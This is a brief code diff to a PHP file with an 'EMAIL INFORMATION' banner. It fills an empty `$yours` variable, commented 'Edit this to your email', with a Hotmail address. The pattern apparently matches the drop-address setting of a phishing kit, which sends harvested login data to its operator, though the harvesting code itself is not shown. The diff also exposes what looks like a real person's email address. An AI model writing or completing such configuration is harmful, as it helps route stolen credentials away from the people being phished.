@@ -12,7 +12,7 @@
          ############# [+] EMAIL INFORMATION [+] ##############
         ########################################################
 
-     	$yours = ""; // Edit this to your email 
+     	$yours = "betrainjorgue@hotmail.com"; // Edit this to your email 
 
 
 	// ================================= //
